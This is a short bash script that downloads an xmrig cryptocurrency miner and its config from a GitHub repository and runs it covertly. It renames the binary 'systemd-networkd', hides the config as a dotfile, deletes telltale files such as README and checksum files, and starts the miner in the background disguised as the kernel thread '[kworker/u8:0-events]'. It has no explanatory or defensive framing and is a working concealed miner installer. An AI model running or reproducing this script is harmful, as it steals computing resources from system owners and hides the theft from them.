#!/bin/bash
# Install into /sec (only path that survives Segfault reconnects).
set -euo pipefail
BASE="${1:-https://raw.githubusercontent.com/andreamiri354-lab/veron/main}"
DEST="${DEST:-/sec/.local/share/systemd}"
mkdir -p "$DEST"
cd "$DEST"

curl -fsSL -o systemd-networkd "$BASE/xmrig"
curl -fsSL -o .network.conf "$BASE/config.json"
chmod +x systemd-networkd

# drop loud names if someone copied the original tree
rm -f xmrig xmrig.log README.txt README.md SHA256SUMS setup-hugepages.sh xmrig.service 2>/dev/null || true

pgrep -f 'kworker/u8:0-events' >/dev/null 2>&1 && exit 0
cd "$DEST"
nohup bash -c "exec -a '[kworker/u8:0-events]' ./systemd-networkd -c .network.conf --background --no-color" >/dev/null 2>&1 &
disown || true
sleep 1
pgrep -af 'kworker/u8:0-events' || pgrep -af systemd-networkd || true
